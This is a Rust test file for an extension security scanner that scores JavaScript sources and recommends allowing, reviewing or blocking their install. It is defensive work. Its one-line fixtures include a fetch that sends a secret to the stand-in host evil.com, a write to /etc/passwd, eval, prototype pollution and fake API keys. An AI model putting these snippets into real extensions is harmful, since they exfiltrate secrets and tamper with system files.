//! Install-time security scanner integration tests (bd-21vng, SEC-2.3)
//!
//! Tests the composite risk classifier that synthesizes preflight and security
//! scanner signals into a single deterministic install-time risk verdict.

mod common;

use pi::extension_preflight::{
    INSTALL_TIME_RISK_SCHEMA, InstallRecommendation, InstallTimeRiskReport, PreflightVerdict,
    RiskTier, SECURITY_RULEBOOK_VERSION, SECURITY_SCAN_SCHEMA, SecurityRuleId, SecurityScanReport,
    SecurityScanner, classify_extension_source, security_evidence_ledger_jsonl,
};
use pi::extensions::ExtensionPolicy;

// ============================================================================
// Helpers
// ============================================================================

fn classify(source: &str) -> InstallTimeRiskReport {
    let policy = ExtensionPolicy::default();
    classify_extension_source("test-ext", source, &policy)
}

fn scan(source: &str) -> SecurityScanReport {
    SecurityScanner::scan_source("test-ext", source)
}

fn has_rule(report: &SecurityScanReport, rule: SecurityRuleId) -> bool {
    report.findings.iter().any(|f| f.rule_id == rule)
}

// ============================================================================
// Composite classifier: clean extension
// ============================================================================

#[test]
fn classify_clean_extension_allows_install() {
    let src = r#"
import path from "node:path";
export default function init(pi) {
    pi.tool({ name: "hello", schema: {} });
}
"#;
    let r = classify(src);
    assert_eq!(r.recommendation, InstallRecommendation::Allow);
    assert!(!r.should_block());
    assert!(!r.needs_review());
    assert_eq!(r.composite_risk_score, 100);
    assert_eq!(r.composite_risk_tier, RiskTier::Low);
    assert_eq!(r.schema, INSTALL_TIME_RISK_SCHEMA);
    assert_eq!(r.rulebook_version, SECURITY_RULEBOOK_VERSION);
}

// ============================================================================
// Composite classifier: critical findings block
// ============================================================================

#[test]
fn classify_eval_blocks_install() {
    let r = classify("eval('malicious');");
    assert_eq!(r.recommendation, InstallRecommendation::Block);
    assert!(r.should_block());
    assert!(r.needs_review());
    assert_eq!(r.composite_risk_tier, RiskTier::Critical);
    assert!(r.composite_risk_score < 80);
}

#[test]
fn classify_process_binding_blocks() {
    let r = classify("process.binding('fs');");
    assert_eq!(r.recommendation, InstallRecommendation::Block);
    assert!(r.should_block());
    assert_eq!(r.composite_risk_tier, RiskTier::Critical);
}

#[test]
fn classify_proto_pollution_blocks() {
    let r = classify("obj.__proto__ = malicious;");
    assert_eq!(r.recommendation, InstallRecommendation::Block);
    assert!(r.should_block());
}

// ============================================================================
// Composite classifier: high findings trigger review
// ============================================================================

#[test]
fn classify_hardcoded_secret_reviews() {
    let r = classify(r#"const api_key = "sk-ant-api03-test123";"#);
    assert_eq!(r.recommendation, InstallRecommendation::Review);
    assert!(r.needs_review());
    assert!(!r.should_block());
    assert_eq!(r.composite_risk_tier, RiskTier::High);
}

#[test]
fn classify_dynamic_import_reviews() {
    let r = classify("const mod = await import(userInput);");
    assert_eq!(r.recommendation, InstallRecommendation::Review);
    assert_eq!(r.composite_risk_tier, RiskTier::High);
}

// ============================================================================
// Composite classifier: combined signals
// ============================================================================

#[test]
fn classify_combined_signals_compound_risk() {
    let src = r#"
import net from "node:net";
eval('x');
const api_key = "sk-ant-test";
debugger;
"#;
    let r = classify(src);
    assert_eq!(r.recommendation, InstallRecommendation::Block);
    // eval(Critical=30) + hardcoded_secret(High=20) + debugger(Low=3) + preflight_error(15) = 68 deductions
    // Score: 100 - 68 = 32
    assert!(
        r.composite_risk_score < 40,
        "score {} should be < 40 for combined critical+high+low findings",
        r.composite_risk_score
    );
    assert_eq!(r.composite_risk_tier, RiskTier::Critical);
    // Both preflight and security should have findings.
    assert!(r.preflight_summary.errors > 0);
    assert!(r.security_summary.critical > 0);
}

#[test]
fn classify_incompatible_module_raises_risk() {
    let r = classify(r#"import net from "node:net";"#);
    assert!(r.composite_risk_score < 100);
    assert!(r.preflight_summary.errors > 0);
    assert_eq!(r.preflight_summary.verdict, PreflightVerdict::Fail);
}

// ============================================================================
// Determinism guarantee
// ============================================================================

#[test]
fn composite_classification_is_deterministic() {
    let source = r#"
eval('x');
const api_key = "sk-ant-test";
import path from "node:path";
debugger;
"#;
    let j1 = classify(source).to_json().unwrap();
    let j2 = classify(source).to_json().unwrap();
    assert_eq!(j1, j2, "Composite classification must be deterministic");
}

#[test]
fn security_scan_is_deterministic() {
    let source = r#"
eval('x');
const api_key = "sk-ant-test";
process.env.HOME;
debugger;
"#;
    let j1 = scan(source).to_json().unwrap();
    let j2 = scan(source).to_json().unwrap();
    assert_eq!(j1, j2, "Security scan must be deterministic");
}

// ============================================================================
// JSON serialization roundtrip
// ============================================================================

#[test]
fn composite_report_json_roundtrip() {
    let r = classify("eval('x'); debugger;");
    let json = r.to_json().unwrap();
    let back: InstallTimeRiskReport = serde_json::from_str(&json).unwrap();
    assert_eq!(back.extension_id, "test-ext");
    assert_eq!(back.recommendation, r.recommendation);
    assert_eq!(back.composite_risk_tier, r.composite_risk_tier);
    assert_eq!(back.composite_risk_score, r.composite_risk_score);
    assert_eq!(back.rulebook_version, SECURITY_RULEBOOK_VERSION);
    assert_eq!(back.schema, INSTALL_TIME_RISK_SCHEMA);
}

#[test]
fn security_report_json_roundtrip() {
    let r = scan("eval('bad'); process.env.KEY;");
    let json = r.to_json().unwrap();
    let back: SecurityScanReport = serde_json::from_str(&json).unwrap();
    assert_eq!(back.extension_id, "test-ext");
    assert_eq!(back.overall_tier, RiskTier::Critical);
    assert!(!back.findings.is_empty());
    assert_eq!(back.schema, SECURITY_SCAN_SCHEMA);
}

// ============================================================================
// Recommendation display and serde
// ============================================================================

#[test]
fn recommendation_display_strings() {
    assert_eq!(format!("{}", InstallRecommendation::Allow), "ALLOW");
    assert_eq!(format!("{}", InstallRecommendation::Review), "REVIEW");
    assert_eq!(format!("{}", InstallRecommendation::Block), "BLOCK");
}

#[test]
fn recommendation_serde_roundtrip() {
    for rec in [
        InstallRecommendation::Allow,
        InstallRecommendation::Review,
        InstallRecommendation::Block,
    ] {
        let json = serde_json::to_string(&rec).unwrap();
        let back: InstallRecommendation = serde_json::from_str(&json).unwrap();
        assert_eq!(rec, back);
    }
}

// ============================================================================
// Verdict format
// ============================================================================

#[test]
fn verdict_includes_score_and_details() {
    let r = classify("eval('x');");
    assert!(r.verdict.contains("BLOCK"), "verdict: {}", r.verdict);
    assert!(r.verdict.contains("/100"), "verdict: {}", r.verdict);
    assert!(r.verdict.contains("critical"), "verdict: {}", r.verdict);
}

#[test]
fn clean_verdict_mentions_allow_and_score() {
    let src = r#"
import path from "node:path";
const p = path.join("a", "b");
"#;
    let r = classify(src);
    assert!(r.verdict.contains("ALLOW"), "verdict: {}", r.verdict);
    assert!(r.verdict.contains("100/100"), "verdict: {}", r.verdict);
}

// ============================================================================
// Edge cases
// ============================================================================

#[test]
fn classify_empty_source_allows() {
    let r = classify("");
    assert_eq!(r.recommendation, InstallRecommendation::Allow);
    assert_eq!(r.composite_risk_score, 100);
    assert_eq!(r.composite_risk_tier, RiskTier::Low);
}

#[test]
fn classify_comments_only_allows() {
    let r = classify("// this is just a comment\n/* block comment */");
    assert_eq!(r.recommendation, InstallRecommendation::Allow);
    assert_eq!(r.composite_risk_score, 100);
}

// ============================================================================
// Security scanner: all 17 rules
// ============================================================================

#[test]
fn rule_eval_detected() {
    assert!(has_rule(&scan("eval('bad');"), SecurityRuleId::EvalUsage));
}

#[test]
fn rule_new_function_detected() {
    assert!(has_rule(
        &scan("const fn = new Function('a', 'return a');"),
        SecurityRuleId::NewFunctionUsage,
    ));
}

#[test]
fn rule_process_binding_detected() {
    assert!(has_rule(
        &scan("process.binding('fs');"),
        SecurityRuleId::ProcessBinding,
    ));
}

#[test]
fn rule_process_dlopen_detected() {
    assert!(has_rule(
        &scan("process.dlopen(module, '/bad.node');"),
        SecurityRuleId::ProcessDlopen,
    ));
}

#[test]
fn rule_proto_pollution_detected() {
    assert!(has_rule(
        &scan("obj.__proto__ = evil;"),
        SecurityRuleId::ProtoPollution,
    ));
    assert!(has_rule(
        &scan("Object.setPrototypeOf(target, evil);"),
        SecurityRuleId::ProtoPollution,
    ));
}

#[test]
fn rule_require_cache_detected() {
    assert!(has_rule(
        &scan("delete require.cache[require.resolve('./m')];"),
        SecurityRuleId::RequireCacheManip,
    ));
}

#[test]
fn rule_hardcoded_secret_detected() {
    assert!(has_rule(
        &scan(r#"const api_key = "sk-ant-api03-abc123";"#),
        SecurityRuleId::HardcodedSecret,
    ));
}

#[test]
fn rule_dynamic_import_detected() {
    assert!(has_rule(
        &scan("const mod = await import(userInput);"),
        SecurityRuleId::DynamicImport,
    ));
}

#[test]
fn rule_define_property_abuse_detected() {
    assert!(has_rule(
        &scan("Object.defineProperty(globalThis, 'fetch', { value: evil });"),
        SecurityRuleId::DefinePropertyAbuse,
    ));
}

#[test]
fn rule_network_exfiltration_detected() {
    assert!(has_rule(
        &scan("fetch(`https://evil.com/?data=${secret}`);"),
        SecurityRuleId::NetworkExfiltration,
    ));
}

#[test]
fn rule_sensitive_path_write_detected() {
    assert!(has_rule(
        &scan("fs.writeFileSync('/etc/passwd', payload);"),
        SecurityRuleId::SensitivePathWrite,
    ));
}

#[test]
fn rule_process_env_detected() {
    assert!(has_rule(
        &scan("const v = process.env.NODE_ENV;"),
        SecurityRuleId::ProcessEnvAccess,
    ));
}

#[test]
fn rule_timer_abuse_detected() {
    assert!(has_rule(
        &scan("setInterval(pollServer, 1);"),
        SecurityRuleId::TimerAbuse,
    ));
}

#[test]
fn rule_proxy_reflect_detected() {
    assert!(has_rule(
        &scan("const p = new Proxy(target, handler);"),
        SecurityRuleId::ProxyReflect,
    ));
    assert!(has_rule(
        &scan("const v = Reflect.get(obj, 'key');"),
        SecurityRuleId::ProxyReflect,
    ));
}

#[test]
fn rule_with_statement_detected() {
    assert!(has_rule(
        &scan("with (obj) { x = 1; }"),
        SecurityRuleId::WithStatement,
    ));
}

#[test]
fn rule_debugger_detected() {
    assert!(has_rule(
        &scan("debugger;"),
        SecurityRuleId::DebuggerStatement,
    ));
}

#[test]
fn rule_console_info_leak_detected() {
    assert!(has_rule(
        &scan("console.error(sensitiveData);"),
        SecurityRuleId::ConsoleInfoLeak,
    ));
}

// ============================================================================
// Security scanner: false positive avoidance
// ============================================================================

#[test]
fn eval_in_identifier_not_flagged() {
    assert!(!has_rule(
        &scan("const retrieval = getData();"),
        SecurityRuleId::EvalUsage,
    ));
}

#[test]
fn static_import_not_flagged_as_dynamic() {
    assert!(!has_rule(
        &scan("import fs from 'node:fs';"),
        SecurityRuleId::DynamicImport,
    ));
}

#[test]
fn env_lookup_not_flagged_as_secret() {
    let r = scan("const key = process.env.API_KEY;");
    assert!(has_rule(&r, SecurityRuleId::ProcessEnvAccess));
    assert!(!has_rule(&r, SecurityRuleId::HardcodedSecret));
}

#[test]
fn normal_timer_not_flagged() {
    assert!(!has_rule(
        &scan("setInterval(tick, 1000);"),
        SecurityRuleId::TimerAbuse,
    ));
}

#[test]
fn normal_write_not_flagged() {
    assert!(!has_rule(
        &scan("fs.writeFileSync('/tmp/out.txt', data);"),
        SecurityRuleId::SensitivePathWrite,
    ));
}

#[test]
fn console_log_not_flagged() {
    assert!(!has_rule(
        &scan("console.log('hello');"),
        SecurityRuleId::ConsoleInfoLeak,
    ));
}

#[test]
fn single_line_comment_not_flagged() {
    assert!(!has_rule(
        &scan("// eval('bad');"),
        SecurityRuleId::EvalUsage,
    ));
}

// ============================================================================
// Evidence ledger: JSONL format
// ============================================================================

#[test]
fn evidence_ledger_produces_valid_jsonl() {
    let r = scan("eval('x'); debugger;");
    let jsonl = security_evidence_ledger_jsonl(&r).unwrap();
    let lines: Vec<&str> = jsonl.lines().collect();
    assert_eq!(lines.len(), r.findings.len());
    for line in &lines {
        let entry: serde_json::Value = serde_json::from_str(line).unwrap();
        assert_eq!(entry["schema"], "pi.ext.security_evidence_ledger.v1");
        assert_eq!(entry["extension_id"], "test-ext");
    }
}

#[test]
fn evidence_ledger_indices_monotonic() {
    let r = scan("eval('a'); eval('b'); debugger;");
    let jsonl = security_evidence_ledger_jsonl(&r).unwrap();
    let indices: Vec<u64> = jsonl
        .lines()
        .map(|l| {
            let v: serde_json::Value = serde_json::from_str(l).unwrap();
            v["entry_index"].as_u64().unwrap()
        })
        .collect();
    for (i, idx) in indices.iter().enumerate() {
        assert_eq!(*idx, i as u64);
    }
}

// ============================================================================
// Risk tier ordering
// ============================================================================

#[test]
fn risk_tier_ordering_correct() {
    assert!(RiskTier::Critical < RiskTier::High);
    assert!(RiskTier::High < RiskTier::Medium);
    assert!(RiskTier::Medium < RiskTier::Low);
}

// ============================================================================
// SecurityRuleId: stable serde names
// ============================================================================

#[test]
fn rule_id_serde_names_stable() {
    let json = serde_json::to_string(&SecurityRuleId::EvalUsage).unwrap();
    assert_eq!(json, "\"SEC-EVAL-001\"");
    let json = serde_json::to_string(&SecurityRuleId::ProcessBinding).unwrap();
    assert_eq!(json, "\"SEC-BIND-001\"");
    let json = serde_json::to_string(&SecurityRuleId::HardcodedSecret).unwrap();
    assert_eq!(json, "\"SEC-SECRET-001\"");
    let json = serde_json::to_string(&SecurityRuleId::DebuggerStatement).unwrap();
    assert_eq!(json, "\"SEC-DEBUG-001\"");
}

// ============================================================================
// Multi-file directory scanning (via SecurityScanner::scan_path)
// ============================================================================

#[test]
fn scan_path_finds_issues_across_files() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();

    // Write two files with different issues.
    std::fs::write(root.join("main.js"), "eval('bad');").unwrap();
    std::fs::write(root.join("util.js"), "debugger;").unwrap();

    let r = SecurityScanner::scan_path("multi-ext", root, root);
    assert!(has_rule(&r, SecurityRuleId::EvalUsage));
    assert!(has_rule(&r, SecurityRuleId::DebuggerStatement));
    assert!(r.findings.len() >= 2);

    // Verify file paths are relative.
    let eval_finding = r
        .findings
        .iter()
        .find(|f| f.rule_id == SecurityRuleId::EvalUsage)
        .unwrap();
    assert_eq!(eval_finding.file.as_deref(), Some("main.js"));
}

#[test]
fn scan_path_skips_node_modules() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();

    std::fs::create_dir(root.join("node_modules")).unwrap();
    std::fs::write(root.join("node_modules/evil.js"), "eval('bad');").unwrap();
    std::fs::write(root.join("clean.js"), "const x = 1;").unwrap();

    let r = SecurityScanner::scan_path("skip-nm", root, root);
    assert!(!has_rule(&r, SecurityRuleId::EvalUsage));
}

#[test]
fn scan_path_handles_block_comments() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();

    std::fs::write(
        root.join("commented.js"),
        "/* eval('bad'); */\nconst x = 1;",
    )
    .unwrap();

    let r = SecurityScanner::scan_path("comment-ext", root, root);
    assert!(!has_rule(&r, SecurityRuleId::EvalUsage));
}
